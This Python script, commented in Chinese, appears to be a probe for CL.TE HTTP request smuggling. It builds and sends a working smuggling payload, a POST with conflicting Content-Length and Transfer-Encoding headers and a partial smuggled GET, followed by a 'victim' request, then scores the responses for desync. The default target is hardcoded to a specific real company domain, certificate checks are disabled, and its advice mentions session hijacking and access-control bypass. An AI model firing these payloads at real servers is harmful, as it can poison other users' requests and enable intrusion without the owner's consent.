import socket
import ssl
import time
import sys
import re
from urllib.parse import urlparse
from dataclasses import dataclass, field
from typing import Optional

# ─── 配置 ────────────────────────────────────────────────────────────────────
DEFAULT_TARGET      = 'https://in-feedback.vivoglobal.com'
DEFAULT_PATH        = '/'
TIMEOUT_CONNECT     = 10
TIMEOUT_READ        = 4
PROBE_RETRIES       = 3
PROBE_DELAY         = 0.5
PROBE_INTERVAL      = 1.0
SMUGGLED_MARKER     = 'xprobe77f3a'
RESPONSE_SIZE_LIMIT = 1 * 1024 * 1024  # 1 MB


# ─── 数据结构 ─────────────────────────────────────────────────────────────────
@dataclass
class ProxyConfig:
    host: str
    port: int
    username: Optional[str] = None
    password: Optional[str] = None


@dataclass
class BaselineResult:
    request:     str
    response:    bytes
    elapsed:     float
    status_code: Optional[str]
    error:       Optional[str] = None


@dataclass
class ProbeResult:
    baseline:  BaselineResult
    poison:    str
    victim:    str
    response:  bytes
    elapsed:   float
    timed_out: bool
    error:     Optional[str] = None


@dataclass
class AnalysisReport:
    indicators: list[str] = field(default_factory=list)
    confidence: str = 'LOW'
    verdict:    str = ''

    def __str__(self):
        lines = [f'置信度: {self.confidence}', f'结论  : {self.verdict}']
        if self.indicators:
            lines.append('迹象  :')
            for item in self.indicators:
                lines.append(f'  • {item}')
        return '\n'.join(lines)


# ─── URL 解析 ─────────────────────────────────────────────────────────────────
def parse_target(user_input: str) -> tuple:
    """解析 URL，返回 (host, port, sni, hosthdr, path, use_tls)"""
    url = user_input.strip() if user_input and user_input.strip() else DEFAULT_TARGET
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    parsed = urlparse(url)
    host   = parsed.hostname
    if not host:
        raise ValueError(f'无法从输入中解析出主机名: {user_input!r}')

    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    path = parsed.path or DEFAULT_PATH
    if parsed.query:
        path += '?' + parsed.query

    is_ipv6 = ':' in host and not host.startswith('[')
    hosthdr = f'[{host}]' if is_ipv6 else parsed.netloc

    default_port = 443 if parsed.scheme == 'https' else 80
    if hosthdr.endswith(f':{default_port}'):
        hosthdr = hosthdr[: -(len(str(default_port)) + 1)]

    use_tls = parsed.scheme == 'https'
    sni     = host
    return host, port, sni, hosthdr, path, use_tls


def parse_proxy(proxy_input: str) -> Optional[ProxyConfig]:
    """
    解析代理 URL，支持格式：
      http://host:port
      http://user:pass@host:port
    返回 ProxyConfig 或 None（输入为空时）
    """
    s = proxy_input.strip()
    if not s:
        return None

    if not s.startswith(('http://', 'https://')):
        s = 'http://' + s

    parsed = urlparse(s)
    host = parsed.hostname
    if not host:
        raise ValueError(f'无法从代理输入中解析出主机名: {proxy_input!r}')

    port = parsed.port or 8080
    username = parsed.username or None
    password = parsed.password or None
    return ProxyConfig(host=host, port=port, username=username, password=password)


# ─── 请求构造 ─────────────────────────────────────────────────────────────────
def build_baseline_request(hosthdr: str, base_path: str) -> str:
    """干净的 GET 请求，用于采集基线"""
    return (
        f'GET {base_path} HTTP/1.1\r\n'
        f'Host: {hosthdr}\r\n'
        'Connection: close\r\n'
        '\r\n'
    )


def build_poison(hosthdr: str, base_path: str) -> str:
    """
    CL.TE 走私载荷：
      前端信任 Content-Length: 5（覆盖 chunked 结束序列 '0\\r\\n\\r\\n'）。
      后端信任 Transfer-Encoding: chunked，读到 chunk-size=0 后将剩余字节
      留在连接缓冲区，等待受害者请求拼接进来。
      走私的 GET 故意不完整（无末尾空行），使后端挂起等待。
    """
    sep           = '' if base_path.endswith('/') else '/'
    smuggled_path = f'{base_path}{sep}{SMUGGLED_MARKER}'
    chunked_end   = '0\r\n\r\n'
    cl            = len(chunked_end.encode())   # == 5

    return (
        f'POST {base_path} HTTP/1.1\r\n'
        f'Host: {hosthdr}\r\n'
        'Content-Type: application/x-www-form-urlencoded\r\n'
        f'Content-Length: {cl}\r\n'
        'Transfer-Encoding: chunked\r\n'
        '\r\n'
        f'{chunked_end}'
        f'GET {smuggled_path} HTTP/1.1\r\n'
        f'Host: {hosthdr}\r\n'
        # 故意省略末尾 \r\n\r\n
    )


def build_victim(hosthdr: str, base_path: str) -> str:
    """跟在投毒包后发送的受害者请求"""
    return (
        f'GET {base_path} HTTP/1.1\r\n'
        f'Host: {hosthdr}\r\n'
        'Connection: close\r\n'
        '\r\n'
    )


def build_connect_request(target_host: str, target_port: int,
                          proxy: ProxyConfig) -> str:
    """构造发往 HTTP 代理的 CONNECT 隧道请求"""
    connect_line = f'CONNECT {target_host}:{target_port} HTTP/1.1\r\n'
    headers = [
        connect_line,
        f'Host: {target_host}:{target_port}\r\n',
    ]
    if proxy.username is not None:
        import base64
        creds = base64.b64encode(
            f'{proxy.username}:{proxy.password or ""}'.encode()
        ).decode()
        headers.append(f'Proxy-Authorization: Basic {creds}\r\n')
    headers.append('\r\n')
    return ''.join(headers)


# ─── 网络层 ───────────────────────────────────────────────────────────────────
def _connect_via_proxy(target_host: str, target_port: int,
                       proxy: ProxyConfig) -> socket.socket:
    """
    通过 HTTP CONNECT 代理建立到目标的 TCP 隧道，返回原始 socket。
    抛出 OSError / ValueError 表示失败。
    """
    raw = socket.create_connection((proxy.host, proxy.port),
                                   timeout=TIMEOUT_CONNECT)
    try:
        connect_req = build_connect_request(target_host, target_port, proxy)
        raw.sendall(connect_req.encode())

        # 读取代理响应（最多 8 KB，直到遇到空行）
        buf = b''
        while b'\r\n\r\n' not in buf:
            chunk = raw.recv(4096)
            if not chunk:
                raise OSError('代理在返回 CONNECT 响应前关闭了连接')
            buf += chunk
            if len(buf) > 8192:
                raise OSError('代理 CONNECT 响应过长')

        first_line = buf.split(b'\r\n', 1)[0].decode(errors='replace')
        m = re.match(r'^HTTP/[12]\.[01] (\d{3})', first_line)
        if not m or m.group(1) != '200':
            raise OSError(f'代理 CONNECT 失败: {first_line}')
    except Exception:
        raw.close()
        raise
    return raw


def create_socket(host: str, port: int, sni: str, use_tls: bool,
                  proxy: Optional[ProxyConfig] = None) -> socket.socket:
    """
    创建到目标的连接。
    - 若提供 proxy，先通过代理的 HTTP CONNECT 建立隧道，再按需包裹 TLS。
    - 否则直连目标。
    """
    if proxy:
        raw = _connect_via_proxy(host, port, proxy)
    else:
        raw = socket.create_connection((host, port), timeout=TIMEOUT_CONNECT)

    if use_tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        return ctx.wrap_socket(raw, server_hostname=sni)
    return raw


def recv_all(sock: socket.socket) -> tuple[bytes, bool]:
    data      = b''
    timed_out = False
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(data) > RESPONSE_SIZE_LIMIT:
                break
    except socket.timeout:
        timed_out = True
    return data, timed_out


# ─── 基线采集 ─────────────────────────────────────────────────────────────────
def send_baseline(
    host: str, port: int, sni: str,
    hosthdr: str, base_path: str, use_tls: bool,
    custom_url: Optional[tuple] = None,
    proxy: Optional[ProxyConfig] = None,
) -> BaselineResult:
    """
    发送干净 GET 请求记录正常状态码、响应大小和耗时。
    如果提供了 custom_url，则向该目标发送基线请求；
    否则向探测目标本身发送。
    """
    if custom_url:
        bl_host, bl_port, bl_sni, bl_hosthdr, bl_path, bl_tls = custom_url
    else:
        bl_host, bl_port, bl_sni, bl_hosthdr, bl_path, bl_tls = (
            host, port, sni, hosthdr, base_path, use_tls
        )

    req   = build_baseline_request(bl_hosthdr, bl_path)
    start = time.monotonic()
    try:
        sock = create_socket(bl_host, bl_port, bl_sni, bl_tls, proxy=proxy)
        sock.settimeout(TIMEOUT_READ)
        sock.sendall(req.encode())
        data, _ = recv_all(sock)
        sock.close()
    except (socket.error, ssl.SSLError, OSError) as e:
        return BaselineResult(req, b'', 0.0, None, error=str(e))

    elapsed     = time.monotonic() - start
    status_code = _first_status_code(data)
    return BaselineResult(req, data, elapsed, status_code)


# ─── 走私探测 ─────────────────────────────────────────────────────────────────
def send_probe(
    host: str, port: int, sni: str,
    hosthdr: str, base_path: str, use_tls: bool,
    custom_baseline_url: Optional[tuple] = None,
    proxy: Optional[ProxyConfig] = None,
) -> ProbeResult:
    """
    执行一次完整的 CL.TE 探测：
      1. 采集基线（独立连接）
      2. 新建连接，发送投毒包，稍候后发送受害者包
      3. 收集响应，记录耗时与超时标志
    """
    baseline = send_baseline(
        host, port, sni, hosthdr, base_path, use_tls,
        custom_url=custom_baseline_url,
        proxy=proxy,
    )

    poison = build_poison(hosthdr, base_path)
    victim = build_victim(hosthdr, base_path)

    start = time.monotonic()
    try:
        sock = create_socket(host, port, sni, use_tls, proxy=proxy)
    except (socket.error, ssl.SSLError, OSError) as e:
        return ProbeResult(baseline, poison, victim, b'', 0.0, False, error=str(e))

    sock.settimeout(TIMEOUT_READ)
    try:
        sock.sendall(poison.encode())
        time.sleep(PROBE_DELAY)
        sock.sendall(victim.encode())
        data, timed_out = recv_all(sock)
    except (socket.error, OSError) as e:
        return ProbeResult(baseline, poison, victim, b'', 0.0, False, error=str(e))
    finally:
        sock.close()

    elapsed = time.monotonic() - start
    return ProbeResult(baseline, poison, victim, data, elapsed, timed_out)


# ─── 响应分析 ─────────────────────────────────────────────────────────────────
def _first_status_code(data: bytes) -> Optional[str]:
    for line in data.decode(errors='replace').split('\r\n'):
        m = re.match(r'^HTTP/[12]\.[01] (\d{3})', line)
        if m:
            return m.group(1)
    return None


def _all_status_lines(text: str) -> list[str]:
    return [
        line for line in text.split('\r\n')
        if re.match(r'^HTTP/[12]\.[01] \d{3}', line)
    ]


def _baseline_summary(bl: BaselineResult) -> str:
    if bl.error:
        return f'基线请求失败（{bl.error}）'
    return (
        f'基线 HTTP {bl.status_code or "?"} | '
        f'{len(bl.response)}B | {bl.elapsed:.2f}s'
    )


def analyze_response(result: ProbeResult, base_path: str) -> AnalysisReport:
    """
    多维度分析，置信度加分制：
      +3  走私标记出现在响应中
      +2  检测到 ≥2 个 HTTP 响应
      +2  基线与探测状态码不一致
      +1  响应超时（后端挂起）
      +1  响应大小与基线差异 > 50B
      +1  收到 400 / 502 / 503

    总分 ≥3 → HIGH，≥1 → MEDIUM，0 → LOW
    """
    report = AnalysisReport()

    if result.error:
        report.verdict = f'连接失败: {result.error}'
        return report

    report.indicators.append(_baseline_summary(result.baseline))

    score = 0

    if not result.response and result.timed_out:
        score += 1
        report.indicators.append(
            f'超时（{result.elapsed:.1f}s）且无字节返回 — '
            '后端可能在等待走私请求的剩余数据'
        )
    elif not result.response:
        report.verdict = '服务器关闭连接，未返回任何数据'
        return report

    text         = result.response.decode(errors='replace')
    status_lines = _all_status_lines(text)

    # ① 多响应
    if len(status_lines) >= 2:
        score += 2
        codes = ', '.join(sl.split()[1] for sl in status_lines[:4])
        report.indicators.append(
            f'检测到 {len(status_lines)} 个 HTTP 响应（{codes}）'
            ' — 响应错位(response misattribution)，强烈指示走私'
        )

    # ② 走私标记命中
    if SMUGGLED_MARKER in text:
        score += 3
        report.indicators.append(
            f'走私标记 "{SMUGGLED_MARKER}" 出现在响应中 — 确认 CL.TE desync'
        )

    # ③ 基线 vs 探测状态码对比
    probe_code = _first_status_code(result.response)
    if (
        result.baseline.status_code
        and probe_code
        and result.baseline.status_code != probe_code
    ):
        score += 2
        report.indicators.append(
            f'状态码变化: 基线 {result.baseline.status_code} → '
            f'走私后首响应 {probe_code} — 受害者请求被后端错误解析'
        )

    # ④ 超时但有数据
    if result.timed_out and result.response:
        score += 1
        report.indicators.append(
            f'读取超时（{result.elapsed:.1f}s）— '
            '响应未正常结束，后端可能挂起等待不完整请求'
        )

    # ⑤ 响应长度差异
    len_delta = len(result.response) - len(result.baseline.response)
    if abs(len_delta) > 50 and result.baseline.response:
        score += 1
        report.indicators.append(
            f'响应长度差异: 基线 {len(result.baseline.response)}B → '
            f'走私后 {len(result.response)}B（Δ {len_delta:+d}B）'
            ' — 后端可能拼接了额外请求头'
        )

    # ⑥ 异常状态码
    all_codes  = {sl.split()[1] for sl in status_lines if len(sl.split()) > 1}
    error_hits = all_codes & {'400', '502', '503'}
    if error_hits:
        score += 1
        report.indicators.append(
            f'收到状态码 {", ".join(sorted(error_hits))} — '
            '前后端解析分歧的间接迹象（需结合其他迹象判断）'
        )

    if score >= 3:
        report.confidence = 'HIGH'
        report.verdict    = (
            '很可能存在 CL.TE HTTP Request Smuggling 漏洞，'
            '建议使用 Burp Suite HTTP Request Smuggler 进一步手工验证'
        )
    elif score >= 1:
        report.confidence = 'MEDIUM'
        report.verdict    = (
            '存在可疑迹象，无法单独确认，'
            '建议深入测试（如劫持会话、绕过访问控制等场景）'
        )
    else:
        report.verdict = (
            '无异常迹象 — 前后端解析一致，'
            '或目标已对 TE/CL 冲突做规范化处理'
        )

    return report


# ─── 多轮探测与汇总 ───────────────────────────────────────────────────────────
def run_probes(
    host: str, port: int, sni: str,
    hosthdr: str, base_path: str, use_tls: bool,
    retries: int = PROBE_RETRIES,
    custom_baseline_url: Optional[tuple] = None,
    proxy: Optional[ProxyConfig] = None,
) -> list[ProbeResult]:
    results = []
    for i in range(retries):
        print(f'  [探测 {i + 1}/{retries}] ', end='', flush=True)
        r = send_probe(
            host, port, sni, hosthdr, base_path, use_tls,
            custom_baseline_url=custom_baseline_url,
            proxy=proxy,
        )
        if r.error:
            status = f'错误: {r.error}'
        elif r.timed_out:
            status = '超时'
        else:
            status = (
                f'{len(r.response)}B  '
                f'基线→{r.baseline.status_code or "?"}  '
                f'探测耗时 {r.elapsed:.2f}s'
            )
        print(status)
        results.append(r)
        if i < retries - 1:
            time.sleep(PROBE_INTERVAL)
    return results


def aggregate_reports(
    results: list[ProbeResult], base_path: str,
) -> AnalysisReport:
    order   = {'HIGH': 3, 'MEDIUM': 2, 'LOW': 1}
    reports = [analyze_response(r, base_path) for r in results]
    best    = max(reports, key=lambda rp: order.get(rp.confidence, 0))

    counts = {'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
    for rp in reports:
        counts[rp.confidence] = counts.get(rp.confidence, 0) + 1

    if best.confidence != 'LOW':
        hit = counts.get(best.confidence, 0)
        best.indicators.append(
            f'重现率: {hit}/{len(reports)} 次探测呈现相同置信度'
        )
    return best


# ─── 输出格式 ─────────────────────────────────────────────────────────────────
SEP = '=' * 62

def section(title: str, content: str):
    print(f'\n{SEP}\n  {title}\n{SEP}')
    print(content)


# ─── 主程序 ───────────────────────────────────────────────────────────────────
def main():
    print('╔════════════════════════════════════════════════════════════╗')
    print('║      CL.TE HTTP Request Smuggling 探测工具                ║')
    print('║  仅供授权渗透测试使用，请勿对未授权目标使用               ║')
    print('╚════════════════════════════════════════════════════════════╝')

    # ── 代理配置（可选）──────────────────────────────────────────────────────
    proxy_input = input(
        '\n输入 HTTP 代理地址（如 http://127.0.0.1:8080 或 '
        'http://user:pass@host:port，直接回车不使用代理）: '
    ).strip()

    proxy: Optional[ProxyConfig] = None
    if proxy_input:
        try:
            proxy = parse_proxy(proxy_input)
            print(
                f'代理     : {proxy.host}:{proxy.port}'
                + (f'  (认证用户: {proxy.username})' if proxy.username else '')
            )
        except ValueError as e:
            print(f'[!] 代理地址解析失败，将不使用代理: {e}')
            proxy = None
    else:
        print('代理     : 不使用（直连）')

    # ── 探测目标 ──────────────────────────────────────────────────────────────
    probe_input = input(
        f'\n输入探测目标 URL（直接回车使用默认 {DEFAULT_TARGET}）: '
    ).strip()

    try:
        host, port, sni, hosthdr, base_path, use_tls = parse_target(probe_input)
    except ValueError as e:
        print(f'[!] 输入错误: {e}')
        sys.exit(1)

    # ── 自定义基线目标（可选）────────────────────────────────────────────────
    custom_baseline_url = None
    baseline_input = input(
        '输入基线请求 URL（直接回车则对探测目标本身发基线）: '
    ).strip()

    if baseline_input:
        try:
            custom_baseline_url = parse_target(baseline_input)
            bl_display = baseline_input
        except ValueError as e:
            print(f'[!] 基线 URL 解析失败，将使用探测目标本身作为基线: {e}')
            bl_display = f'{host}:{port}{base_path}（回退到探测目标）'
    else:
        bl_display = f'{host}:{port}{base_path}（与探测目标相同）'

    print(f'\n探测目标 : {host}:{port}  (TLS: {use_tls})')
    print(f'路径     : {base_path}')
    print(f'SNI      : {sni}')
    print(f'Host 头  : {hosthdr}')
    print(f'基线目标 : {bl_display}')
    print(f'标记     : {SMUGGLED_MARKER}')
    print(f'探测轮数 : {PROBE_RETRIES}')
    if proxy:
        print(f'代理     : {proxy.host}:{proxy.port}')
    print()

    results = run_probes(
        host, port, sni, hosthdr, base_path, use_tls,
        custom_baseline_url=custom_baseline_url,
        proxy=proxy,
    )

    # ── 输出第一轮详情（顺序：基线请求→基线响应→投毒包→走私响应）────────────
    first = results[0]

    # 1. 基线请求
    section('基线请求（干净 GET）', first.baseline.request)

    # 2. 基线响应
    bl_resp_text = (
        first.baseline.response.decode(errors='replace')
        if first.baseline.response else '（无响应）'
    )
    section(
        f'基线响应（HTTP {first.baseline.status_code or "?"}  '
        f'{len(first.baseline.response)}B  {first.baseline.elapsed:.2f}s）',
        bl_resp_text,
    )

    if not first.error:
        # 3. Poison payload
        section('Poison payload（CL.TE 走私载荷）', repr(first.poison))

        # 4. Victim request
        section('Victim request', repr(first.victim))

        # 5. 走私探测响应
        probe_resp_text = (
            first.response.decode(errors='replace')
            if first.response else '（无响应）'
        )
        section('走私探测响应（第 1 次）', probe_resp_text)

    # ── 综合结论 ──────────────────────────────────────────────────────────────
    report = aggregate_reports(results, base_path)
    section('综合分析结论', str(report))


if __name__ == '__main__':
    main()
